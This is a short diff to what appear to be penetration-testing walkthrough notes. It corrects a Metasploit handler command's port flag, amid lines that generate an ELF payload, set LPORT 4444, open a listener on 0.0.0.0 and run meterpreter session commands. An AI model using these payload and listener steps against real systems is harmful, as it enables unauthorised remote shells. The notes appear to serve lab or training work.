@@ -630,7 +630,7 @@ walkthrough
 		set LPORT 4444
 		set prepend true
 		generate -f elf -o filename
-		handler -p payload -H 0.0.0.0 -p 4444
+		handler -p payload -H 0.0.0.0 -P 4444
 in the meterpreter session
 	resolve (hotsname)
 	bg
